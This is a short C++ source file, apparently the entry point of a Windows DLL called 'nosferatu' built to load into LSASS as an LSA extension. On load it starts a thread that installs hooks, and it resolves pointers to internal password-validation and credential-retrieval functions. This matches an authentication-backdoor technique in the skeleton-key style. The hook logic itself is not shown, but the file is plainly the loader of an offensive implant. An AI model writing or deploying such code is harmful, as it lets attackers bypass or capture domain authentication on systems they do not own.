#include "pch.h"
#include "nosferatu.h"

pMsvpPasswordValidate MsvpPasswordValidate = nullptr;
pCDLocateCSystem CDLocateCSystem = nullptr;
pSamIRetrieveMultiplePrimaryCredentials SamIRetrieveMultiplePrimaryCredentials = nullptr;

extern "C" __declspec(dllexport)
NTSTATUS WINAPI InitializeLsaExtension(LSA_EXTENSION_INIT_STAGE value)
{
    return STATUS_SUCCESS;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&InstallHook, NULL, 0, NULL);
        return TRUE;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

